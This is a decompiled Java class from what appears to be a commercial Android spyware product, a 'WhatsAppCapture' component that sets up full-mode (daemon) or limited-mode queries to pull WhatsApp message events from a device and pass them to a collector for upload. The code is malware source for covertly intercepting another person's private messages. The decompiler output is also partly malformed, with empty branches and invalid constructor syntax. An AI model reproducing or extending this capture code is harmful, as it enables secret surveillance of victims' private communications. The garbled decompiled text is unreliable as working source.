package com.vvt.capture.wa;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.wa.a.c;
import com.vvt.capture.wa.full.WhatsAppDaemonQuery;
import com.vvt.capture.wa.full.d;
import com.vvt.capture.wa.limited.LimitedWhatsAppQuery;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private String c;
  private e d;
  private f e;
  private com.vvt.base.b f;
  
  public a(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, Context paramContext, com.vvt.n.a.b paramb, com.vvt.base.b paramb1)
  {
    this.f = paramb1;
    this.c = paramString;
    this.b = parama;
    Object localObject = RunningMode.FULL;
    boolean bool;
    String str;
    com.vvt.base.b localb;
    if (paramRunningMode == localObject)
    {
      bool = a;
      if (bool) {}
      localObject = new com/vvt/capture/wa/full/d;
      ((d)localObject).<init>();
      this.d = ((e)localObject);
      localObject = new com/vvt/capture/wa/full/WhatsAppDaemonQuery;
      str = this.c;
      localb = this.f;
      ((WhatsAppDaemonQuery)localObject).<init>(str, localb);
      this.e = ((f)localObject);
    }
    for (;;)
    {
      return;
      localObject = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject)
      {
        bool = a;
        if (bool) {}
        localObject = new com/vvt/capture/wa/limited/b;
        ((com.vvt.capture.wa.limited.b)localObject).<init>(paramb);
        this.d = ((e)localObject);
        localObject = new com/vvt/capture/wa/limited/LimitedWhatsAppQuery;
        str = this.c;
        localb = this.f;
        ((LimitedWhatsAppQuery)localObject).<init>(str, localb);
        this.e = ((f)localObject);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.f = paramb;
    boolean bool = a;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof c;
      if (bool2)
      {
        localObject = com.vvt.capture.wa.b.a.a((c)localObject);
        if (localObject != null)
        {
          int i = ((List)localObject).size();
          if (i > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.b;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = this.b;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  protected e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "WhatsAppCapture";
  }
  
  protected String e()
  {
    return this.c;
  }
  
  protected String f()
  {
    return "whatsapp.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */